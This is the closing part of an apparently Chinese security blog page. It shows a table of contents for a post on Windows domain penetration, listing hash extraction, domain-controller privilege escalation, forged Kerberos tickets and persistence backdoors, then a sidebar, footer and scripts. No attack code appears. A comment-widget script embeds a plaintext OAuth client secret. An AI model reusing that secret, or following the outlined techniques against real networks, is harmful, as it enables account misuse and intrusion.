class="toc-text">smbexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCOM%EF%BC%88%E5%88%86%E5%B8%83%E5%BC%8F%E7%BB%84%E4%BB%B6%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%EF%BC%89"><span class="toc-number">10.10.</span> <span class="toc-text">DCOM（分布式组件对象模型）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SPN%E5%9C%A8%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">10.11.</span> <span class="toc-text">SPN在域环境的应用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exchange%E6%B8%97%E9%80%8F"><span class="toc-number">10.12.</span> <span class="toc-text">Exchange渗透</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7"><span class="toc-number">11.</span> <span class="toc-text">域控</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8F%96ntds-dit"><span class="toc-number">11.1.</span> <span class="toc-text">提取ntds.dit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%87%BAntds-dit%E4%B8%AD%E7%9A%84hash"><span class="toc-number">11.2.</span> <span class="toc-text">导出ntds.dit中的hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8vshadow%E5%92%8CQuarksPwDump%E5%AF%BC%E5%87%BA%E5%9F%9F%E8%B4%A6%E5%8F%B7%E5%92%8C%E5%9F%9Fhash"><span class="toc-number">11.3.</span> <span class="toc-text">使用vshadow和QuarksPwDump导出域账号和域hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%EF%BC%88MS14-048%E3%80%81CVE-2014-6324%EF%BC%89"><span class="toc-number">11.4.</span> <span class="toc-text">域内提权（MS14-048、CVE-2014-6324）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%9E%97"><span class="toc-number">12.</span> <span class="toc-text">域林</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">12.1.</span> <span class="toc-text">获取域信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%AF%86%E9%92%A5%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E5%9F%9F%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">12.2.</span> <span class="toc-text">利用域信任密钥获取目标域的权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8krbtgt%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E5%9F%9F%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">12.3.</span> <span class="toc-text">利用krbtgt散列值获取目标域的权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E6%9E%97%E6%94%BB%E5%87%BB"><span class="toc-number">12.4.</span> <span class="toc-text">跨林攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1472-windows%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83"><span class="toc-number">12.5.</span> <span class="toc-text">CVE-2020-1472 windows域控提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-3"><span class="toc-number">13.</span> <span class="toc-text">后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8"><span class="toc-number">13.1.</span> <span class="toc-text">粘滞键后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%8E%E9%97%A8"><span class="toc-number">13.2.</span> <span class="toc-text">注册表后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%90%8E%E9%97%A8"><span class="toc-number">13.3.</span> <span class="toc-text">计划任务后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#weevely%E7%9A%84webshell%E5%90%8E%E9%97%A8-php"><span class="toc-number">13.4.</span> <span class="toc-text">weevely的webshell后门 php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8DSRM%E6%8C%81%E4%B9%85%E5%8C%96%E6%8E%A7%E5%88%B6%E5%9F%9F%E6%8E%A7"><span class="toc-number">13.5.</span> <span class="toc-text">利用DSRM持久化控制域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SSP%E6%8C%81%E4%B9%85%E5%8C%96%E6%8E%A7%E5%88%B6%E5%9F%9F%E6%8E%A7"><span class="toc-number">13.6.</span> <span class="toc-text">利用SSP持久化控制域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SID-History%E5%9F%9F%E5%90%8E%E9%97%A8"><span class="toc-number">13.7.</span> <span class="toc-text">SID History域后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">13.8.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0"><span class="toc-number">13.9.</span> <span class="toc-text">白银票据伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Skeleton-Key-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">13.10.</span> <span class="toc-text">Skeleton Key-万能密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hook-PasswordChangeNotify"><span class="toc-number">13.11.</span> <span class="toc-text">Hook PasswordChangeNotify</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nishang%E5%90%8E%E9%97%A8"><span class="toc-number">13.12.</span> <span class="toc-text">Nishang后门</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/16/%E6%9F%90-NET%E6%A1%86%E6%9E%B6%E7%B3%BB%E7%BB%9F%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="某.NET框架系统上传漏洞源码分析">某.NET框架系统上传漏洞源码分析</a><time datetime="2022-07-16T14:56:31.000Z" title="发表于 2022-07-16 22:56:31">2022-07-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/05/25/AntSword-%E8%9A%81%E5%89%91%E7%BC%96%E8%A7%A3%E7%A0%81%E5%99%A8%E5%8F%8Awebshell%E7%BC%96%E5%86%99/" title="AntSword-蚁剑编解码器及webshell编写">AntSword-蚁剑编解码器及webshell编写</a><time datetime="2022-05-25T15:03:59.000Z" title="发表于 2022-05-25 23:03:59">2022-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/05/18/json%E8%A7%A3%E6%9E%90/" title="Json解析">Json解析</a><time datetime="2022-05-18T06:38:49.000Z" title="发表于 2022-05-18 14:38:49">2022-05-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/05/12/MSAT-MSSQL%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E5%B7%A5%E5%85%B7/" title="MSAT-MSSQL正反向连接工具">MSAT-MSSQL正反向连接工具</a><time datetime="2022-05-12T08:45:00.000Z" title="发表于 2022-05-12 16:45:00">2022-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/05/06/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="内网学习记录">内网学习记录</a><time datetime="2022-05-06T09:53:23.000Z" title="发表于 2022-05-06 17:53:23">2022-05-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By GabgM</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '9cba692b8efd3f9e5298',
      clientSecret: '34c2658153d633e019dbbf75617aae80ee0bf814',
      repo: 'gabgm.github.io',
      owner: 'GabgM',
      admin: ['GabgM'],
      id: '30c5525b940e73d8c59919dd15205b01',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>